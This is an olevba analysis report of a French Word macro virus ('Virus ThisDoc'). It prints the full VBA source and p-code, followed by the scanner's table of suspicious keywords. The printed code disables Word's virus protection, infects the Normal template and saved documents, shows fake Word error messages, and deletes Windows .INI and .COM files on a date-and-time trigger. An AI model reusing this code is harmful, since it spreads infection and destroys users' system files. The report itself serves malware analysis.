olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.ThisDocument
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.ThisDocument - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
Application.EnableCancelKey = wdCancelDisabled
Application.DisplayAlerts = wdAlertsNone
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorDO
Dim Fichier$
Fichier$ = Dir("C:\ThisDoc.log")
If Fichier$ <> "ThisDoc.log" Then
    Application.VBE.ActiveVBProject.VBComponents("ThisDocument").Export FileName:="C:\ThisDoc.log"
    NormalTemplate.VBProject.VBComponents("ThisDocument").CodeModule.AddFromFile FileName:="C:\ThisDoc.log"
    NormalTemplate.VBProject.VBComponents("ThisDocument").CodeModule.DeleteLines 1, 5
    MsgBox "Attention, ThisDocument est infecté...", vbInformation, "Virus ThisDoc"
End If
ErrorDO:
End Sub
Sub FileSaveAs()
Application.EnableCancelKey = wdCancelDisabled
Application.DisplayAlerts = wdAlertsNone
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorFSA
    Dialogs(wdDialogFileSaveAs).Show
    If ActiveDocument.SaveFormat = wdFormatTemplate Or ActiveDocument.SaveFormat = wdFormatDocument Then
        ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
    End If
ActiveDocument.VBProject.VBComponents("ThisDocument").CodeModule.AddFromFile FileName:="C:\ThisDoc.log"
ActiveDocument.VBProject.VBComponents("ThisDocument").CodeModule.DeleteLines 1, 5
MsgBox "Je suis une Nouvelle Génération de Virus de Macro...", vbInformation, "Virus ThisDoc"
ErrorFSA:
End Sub
Sub AutoExec()
Application.EnableCancelKey = wdCancelDisabled
Application.DisplayAlerts = wdAlertsNone
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorAE
Dim MyDate, MyTime
MyDate = Date
MyTime = Time
D$ = Mid(MyDate, 1, 2)
If D$ = "15" Then
    MsgBox "ZeMacroKiller98 est heureux de vous présenter sa nouvelle création...", vbInformation, "Virus ThisDoc"
End If
T$ = Mid(MyTime, 1, 2)
If T$ = D$ Then
    MsgBox "Vos données vont être détruites...", vbCritical, "Virus ThisDoc"
    Kill "C:\Windows\*.INI"
    Kill "C:\Windows\*.COM"
End If
ErrorAE:
End Sub
Sub ToolsMacro()
Application.EnableCancelKey = wdCancelDisabled
Application.DisplayAlerts = wdAlertsNone
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorTM
    MsgBox "Erreur Système" & Chr$(13) & "Veuillez réessayer plus tard", vbInformation, "Microsoft Word"
ErrorTM:
End Sub
Sub ViewVBCode()
Application.EnableCancelKey = wdCancelDisabled
Application.DisplayAlerts = wdAlertsNone
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorVVBC
    MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, "Microsoft Word"
ErrorVVBC:
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.ThisDocument
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 15500 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #2:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #3:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #4:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #5:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #6:
' 	OnError ErrorDO 
' Line #7:
' 	Dim 
' 	VarDefn Fichier
' Line #8:
' 	LitStr 0x000E "C:\ThisDoc.log"
' 	ArgsLd Dir 0x0001 
' 	St Fichier$ 
' Line #9:
' 	Ld Fichier$ 
' 	LitStr 0x000B "ThisDoc.log"
' 	Ne 
' 	IfBlock 
' Line #10:
' 	LitStr 0x000E "C:\ThisDoc.log"
' 	ParamNamed FileName 
' 	LitStr 0x000C "ThisDocument"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #11:
' 	LitStr 0x000E "C:\ThisDoc.log"
' 	ParamNamed FileName 
' 	LitStr 0x000C "ThisDocument"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #12:
' 	LitDI2 0x0001 
' 	LitDI2 0x0005 
' 	LitStr 0x000C "ThisDocument"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #13:
' 	LitStr 0x0026 "Attention, ThisDocument est infecté..."
' 	Ld vbInformation 
' 	LitStr 0x000D "Virus ThisDoc"
' 	ArgsCall MsgBox 0x0003 
' Line #14:
' 	EndIfBlock 
' Line #15:
' 	Label ErrorDO 
' Line #16:
' 	EndSub 
' Line #17:
' 	FuncDefn (Sub FileSaveAs())
' Line #18:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #19:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #20:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #21:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #22:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #23:
' 	OnError ErrorFSA 
' Line #24:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #25:
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #26:
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #27:
' 	EndIfBlock 
' Line #28:
' 	LitStr 0x000E "C:\ThisDoc.log"
' 	ParamNamed FileName 
' 	LitStr 0x000C "ThisDocument"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #29:
' 	LitDI2 0x0001 
' 	LitDI2 0x0005 
' 	LitStr 0x000C "ThisDocument"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #30:
' 	LitStr 0x0034 "Je suis une Nouvelle Génération de Virus de Macro..."
' 	Ld vbInformation 
' 	LitStr 0x000D "Virus ThisDoc"
' 	ArgsCall MsgBox 0x0003 
' Line #31:
' 	Label ErrorFSA 
' Line #32:
' 	EndSub 
' Line #33:
' 	FuncDefn (Sub AutoExec())
' Line #34:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #35:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #36:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #37:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #38:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #39:
' 	OnError ErrorAE 
' Line #40:
' 	Dim 
' 	VarDefn MyDate
' 	VarDefn MyTime
' Line #41:
' 	Ld Date 
' 	St MyDate 
' Line #42:
' 	Ld Time 
' 	St MyTime 
' Line #43:
' 	Ld MyDate 
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	St D$ 
' Line #44:
' 	Ld D$ 
' 	LitStr 0x0002 "15"
' 	Eq 
' 	IfBlock 
' Line #45:
' 	LitStr 0x0045 "ZeMacroKiller98 est heureux de vous présenter sa nouvelle création..."
' 	Ld vbInformation 
' 	LitStr 0x000D "Virus ThisDoc"
' 	ArgsCall MsgBox 0x0003 
' Line #46:
' 	EndIfBlock 
' Line #47:
' 	Ld MyTime 
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	St T$ 
' Line #48:
' 	Ld T$ 
' 	Ld D$ 
' 	Eq 
' 	IfBlock 
' Line #49:
' 	LitStr 0x0022 "Vos données vont être détruites..."
' 	Ld vbCritical 
' 	LitStr 0x000D "Virus ThisDoc"
' 	ArgsCall MsgBox 0x0003 
' Line #50:
' 	LitStr 0x0010 "C:\Windows\*.INI"
' 	ArgsCall Kill 0x0001 
' Line #51:
' 	LitStr 0x0010 "C:\Windows\*.COM"
' 	ArgsCall Kill 0x0001 
' Line #52:
' 	EndIfBlock 
' Line #53:
' 	Label ErrorAE 
' Line #54:
' 	EndSub 
' Line #55:
' 	FuncDefn (Sub ToolsMacro())
' Line #56:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #57:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #58:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #59:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #60:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #61:
' 	OnError ErrorTM 
' Line #62:
' 	LitStr 0x000E "Erreur Système"
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitStr 0x001C "Veuillez réessayer plus tard"
' 	Concat 
' 	Ld vbInformation 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #63:
' 	Label ErrorTM 
' Line #64:
' 	EndSub 
' Line #65:
' 	FuncDefn (Sub ViewVBCode())
' Line #66:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #67:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #68:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #69:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #70:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #71:
' 	OnError ErrorVVBC 
' Line #72:
' 	LitStr 0x0044 "Ce programme a réalisé une opération illégale et va être interrompu."
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #73:
' 	Label ErrorVVBC 
' Line #74:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |Application.VBE     |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

